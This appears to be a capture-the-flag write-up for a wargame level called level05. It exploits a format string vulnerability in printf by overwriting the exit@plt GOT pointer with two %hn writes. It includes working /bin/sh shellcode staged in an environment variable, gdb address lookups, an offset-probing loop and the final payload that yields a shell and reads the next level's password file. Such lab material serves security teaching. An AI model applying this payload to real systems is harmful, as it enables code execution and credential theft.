# level05

Based on the [source code](./source.c), we'll perform a *format string attack* on an unprotected `printf` call.
To avoid complications from the XOR operations in the code, we'll store our shellcode in an environment variable and overwrite the `exit@plt` address with its location.

The PLT entry for `exit` is actually a pointer to a pointer. Let’s inspect it:

```bash
(gdb)  info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
...
0x08048370  exit@plt
...
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
```

We'll set an environment variable named `SC`, containing a NOP sled followed by shellcode:

```bash
export SC=$(python -c 'print("\x90" * 1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

Let's locate it in memory — any address in the NOP sled is usable (e.g., `0xffffdc59`):

```bash
(gdb) x/200s environ
...
0xffffdb1e:      "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
...
0xffffdf06:      "\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
...
```

We need to determine which argument index corresponds to our input:

```bash
level05@OverRide:~$ for ((i = 1; i < 42; i++)); do echo "AAAA $i %$i\$p" | ./level05; done
...
aaaa 10 0x61616161
...
```

We want to overwrite the pointer at `0x080497e0` with the address of our shellcode:`0xffffdc59`
We’ll write this using two half-word (%hn) writes, targeting:

- `0x080497e0` → to write the lower 2 bytes: 0xdc59 → 56409
- `0x080497e2` → to write the upper 2 bytes: 0xffff → 65535

Now, account for the 8 bytes taken up by the addresses at the beginning of the payload:
56409 - 8 = 56401   ← first padding
65535 - 56409 = 9126  ← second padding

We construct the format string:

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401c" + "%10$hn" + "%9126c" + "%11$hn"'; cat) | ./level05

```

Let's get the flag:

```bash
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | ./level05
whoami
level06
cat /home/users/level06/.pass
<flag>
```
